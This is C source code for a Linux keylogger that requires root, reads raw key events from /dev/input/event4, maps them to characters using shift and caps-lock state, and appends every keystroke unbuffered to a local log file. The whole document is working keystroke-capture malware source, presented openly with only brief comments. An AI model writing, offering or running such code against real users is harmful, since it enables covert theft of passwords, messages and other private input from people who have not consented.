#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h>

#define KEY_PRESS 1
#define KEY_RELEASE 0
#define LEFTSHIFT 42
#define RIGHTSHIFT 54
#define CAPSLOCK 58
#define ROOTID 0

// arrays for keys(for both small and capital chars)
static char *keys_upper[] = {"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE", "	", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "LEFTSHIFT", "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "RIGHTSHIFT", "*", "LEFTALT", " ", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "ZENKAKUHANKAKU", "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "JPCOMMA", "ENTER", "RIGHTCTRL", "/", "SYSRQ", "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END", "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER"};
static char *keys_lower[] = {"reserved", "esc", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "backspace", "	", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "{", "}", "enter", "leftctrl", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "leftshift", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "rightshift", "*", "leftalt", " ", "capslock", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "numlock", "scrolllock", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "zenkakuhankaku", "102nd", "f11", "f12", "ro", "katakana", "hiragana", "henkan", "katakanahiragana", "muhenkan", "jpcomma", "enter", "rightctrl", "/", "sysrq", "rightalt", "linefeed", "home", "up", "pageup", "left", "right", "end", "down", "pagedown", "insert", "delete", "macro", "mute", "volumedown", "volumeup", "power"};

// checking for shift key
static int isShiftPressed(int eventcode){
	if((eventcode == LEFTSHIFT) || (eventcode == RIGHTSHIFT)){
		return 1;
	}
	return 0;
}

// checking for capslock
static int isCapsOn(int eventcode){
	if(eventcode == CAPSLOCK){
		return 1;
	}
	return 0;
}

// convert event code to corresponding char
static char *pressedKey(int eventcode, int shift, int caps){
	if(shift^caps){
		return keys_upper[eventcode];
	}
	return keys_lower[eventcode];
}

// main function
int main(){

	// initializations
	typedef struct input_event input_event;
	input_event event;
	int shift = 0;
	int caps = 0;

	// banner
	printf("############ Keylogger Started #############\n");

	// root check
	if(geteuid() != ROOTID){
		printf("You must be root\n");
		exit(0);
	}

	// log file
	FILE *lf = fopen("log", "a");

	// log file check
	if(lf == NULL){
		printf("Error in opening Log file\n");
		exit(0);
	}

	/* To disable buffering and allow writing to log file 
		as soon as a key is pressed */
	setbuf(lf, NULL);

	// device file
	int fp = open("/dev/input/event4", O_RDONLY);

	// device check
	if(fp == -1){
		printf("Device file not found\n");
		exit(0);
	}

	// capturing keystrokes
	while(1){
		if(read(fp, &event, sizeof(input_event))>0){
			if(event.type == EV_KEY){
				if(event.value == KEY_PRESS){
					if(isShiftPressed(event.code)){
						shift = 1;
					}
					if(isCapsOn(event.code)){
						caps = caps^1;
					}
					char *key = pressedKey(event.code, shift, caps);
					fputs(key, lf);
				}
				if(event.value == KEY_RELEASE){
					if(isShiftPressed(event.code)){
						shift = 0;
					}
				}
			}
		}
	}

	// close file
	close(fp);
	fclose(lf);

	// footer
	printf("Exiting...\n");

	return 0;
}
